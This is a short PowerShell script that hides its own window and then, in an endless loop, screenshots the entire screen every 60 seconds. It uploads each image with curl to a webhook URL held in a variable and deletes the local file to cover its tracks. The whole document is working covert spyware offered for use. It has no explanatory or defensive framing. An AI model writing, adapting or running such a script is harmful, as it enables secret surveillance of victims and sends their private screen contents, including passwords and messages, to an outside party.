
$HideWindow = 1
If ($HideWindow -gt 0){
$Import = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
add-type -name win -member $Import -namespace native;
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);
}

While ($true){

$hookurl = "$dc"

$Filett = "$env:temp\SC.png"
Add-Type -AssemblyName System.Windows.Forms
Add-type -AssemblyName System.Drawing
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$Width = $Screen.Width
$Height = $Screen.Height
$Left = $Screen.Left
$Top = $Screen.Top
$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
$bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
Start-Sleep 1
curl.exe -F "file1=@$filett" $hookurl
Start-Sleep 1
Remove-Item -Path $filett

Start-Sleep 60 # change to whatever interval you would like beetween screenshots
}
